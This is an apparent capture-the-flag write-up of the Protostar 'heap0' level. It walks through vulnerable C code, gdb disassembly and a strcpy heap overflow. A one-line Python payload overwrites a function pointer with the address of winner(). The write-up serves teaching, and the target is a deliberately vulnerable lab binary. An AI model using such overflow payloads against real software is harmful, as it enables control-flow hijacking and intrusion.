# HEAP 0

## SOURCE CODE

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct data {
    char name[64];
};

struct fp {
    int (*fp)();
};

void winner()
{
    printf("level passed\n");
}

void nowinner()
{
    printf("level has not been passed\n");
}

int main(int argc, char **argv)
{
    struct data *d;
    struct fp *f;

    d = malloc(sizeof(struct data));
    f = malloc(sizeof(struct fp));
    f->fp = nowinner;

    printf("data is at %p, fp is at %p\n", d, f);

    strcpy(d->name, argv[1]);                      // <- Buffer Overflow Vuln occurs in here
    
    f->fp();
}
```

## OVERVIEW

- The name of this challenge has reviewed for us what we will do in this challenge. Hehe yes, we will work with heap.
- Look at the main function, we can see that, we have 2 pointer variable that point to struct variable, it's `data` and `fp` that is defined at the top of code.
  + Inside the `data` has a member variable `name`, which is a array of char.
  + The `fp` has a member variable function pointer, which is point to a function address.
- Outside the main function, we have another `nowinner` and `winner` function that print something, and this challenge's target is run into `winner` function.
- After initializing 2 pointer variable `d` and `f`, the program allocates memories for them with `malloc()`, then the pointer to a function `fp` of `f` is assigned with address of `nowinner` function, then the program prints the address of `d` and `f`, then copy the `arg[1]` and put it in `d->name` by `strcpy()` and run into the function that `fp` point at.

```
root@protostar:/opt/protostar/bin# ./heap0 AAAA
data is at 0x804a008, fp is at 0x804a050
level has not been passed
```
- But, look at the `strcpy()` function, this function was descripted by this code `char *strcpy(char *restrict dest, const char *src);`. 
- The function takes 2 pointer that point to char type `dest` and `src`. `strcpy()` copies the content that's pointed by `src` including the null byte `('\0')` to the `dest` content that's pointed by `dest`. The function does not limit the size that is copied.
- So, we can take advantage Buffer Overflow Vuln to fill up from `d->name` to `f->fp`, and at `f->fp`, we overwrite the address of `winner` function.

## DETAILS

- This is a disassembly code of main function. We can see in assembly level, the operation of malloc() is just create a memory that can be used and return the address of that memory for a variable that call to it.

```asm
(gdb) disass main
Dump of assembler code for function main:
0x0804848c <main+0>:    push   ebp
0x0804848d <main+1>:    mov    ebp,esp
0x0804848f <main+3>:    and    esp,0xfffffff0
0x08048492 <main+6>:    sub    esp,0x20
0x08048495 <main+9>:    mov    DWORD PTR [esp],0x40            ;<- feed argument for malloc() in stack
0x0804849c <main+16>:   call   0x8048388 <malloc@plt>          ;<- call malloc()
0x080484a1 <main+21>:   mov    DWORD PTR [esp+0x18],eax        ;<- return value that is address of memory allocated in heap is held in eax
0x080484a5 <main+25>:   mov    DWORD PTR [esp],0x4             ; repeate the task
0x080484ac <main+32>:   call   0x8048388 <malloc@plt>          ;
0x080484b1 <main+37>:   mov    DWORD PTR [esp+0x1c],eax        ;
0x080484b5 <main+41>:   mov    edx,0x8048478
0x080484ba <main+46>:   mov    eax,DWORD PTR [esp+0x1c]
0x080484be <main+50>:   mov    DWORD PTR [eax],edx
0x080484c0 <main+52>:   mov    eax,0x80485f7
0x080484c5 <main+57>:   mov    edx,DWORD PTR [esp+0x1c]
0x080484c9 <main+61>:   mov    DWORD PTR [esp+0x8],edx
0x080484cd <main+65>:   mov    edx,DWORD PTR [esp+0x18]
0x080484d1 <main+69>:   mov    DWORD PTR [esp+0x4],edx
0x080484d5 <main+73>:   mov    DWORD PTR [esp],eax
0x080484d8 <main+76>:   call   0x8048378 <printf@plt>
0x080484dd <main+81>:   mov    eax,DWORD PTR [ebp+0xc]
0x080484e0 <main+84>:   add    eax,0x4
0x080484e3 <main+87>:   mov    eax,DWORD PTR [eax]
0x080484e5 <main+89>:   mov    edx,eax
0x080484e7 <main+91>:   mov    eax,DWORD PTR [esp+0x18]
0x080484eb <main+95>:   mov    DWORD PTR [esp+0x4],edx         ; feed the argument for strcpy
0x080484ef <main+99>:   mov    DWORD PTR [esp],eax             ; 
0x080484f2 <main+102>:  call   0x8048368 <strcpy@plt>          ; call strcpy
0x080484f7 <main+107>:  mov    eax,DWORD PTR [esp+0x1c]
0x080484fb <main+111>:  mov    eax,DWORD PTR [eax]
0x080484fd <main+113>:  call   eax
0x080484ff <main+115>:  leave
0x08048500 <main+116>:  ret
End of assembler dump.
```

- But we can just run the program to take the 2 address of memory in heap and calculate the padding that we must to fill up to reach the `f->fp` function pointer and overwrite it with `winner` address. Then done~

```bash
root@protostar:/opt/protostar/bin# ./heap0
data is at 0x804a008, fp is at 0x804a050
Segmentation fault
```
- We get the address of 2 block of memory, so the bytes we must to fill up is `0x804a050 - 0x804a008 = 72 bytes`.

- Disassembling the `winner` function and we found the address of it is in `0x08048464`

```asm
(gdb) disass winner
Dump of assembler code for function winner:
0x08048464 <winner+0>:  push   %ebp
0x08048465 <winner+1>:  mov    %esp,%ebp
0x08048467 <winner+3>:  sub    $0x18,%esp
0x0804846a <winner+6>:  movl   $0x80485d0,(%esp)
0x08048471 <winner+13>: call   0x8048398 <puts@plt>
0x08048476 <winner+18>: leave
0x08048477 <winner+19>: ret
End of assembler dump.
```

- Now, we have all the required elements, let's exploit it!

## EXPLOIT

- Command
```
./heap0 $(python -c 'print("a"*72 + "\x64\x84\x04\x08")')
```

## RESULT

```
root@protostar:/opt/protostar/bin# ./heap0 $(python -c 'print("a"*72 + "\x64\x84\x04\x08")')
data is at 0x804a008, fp is at 0x804a050
level passed
```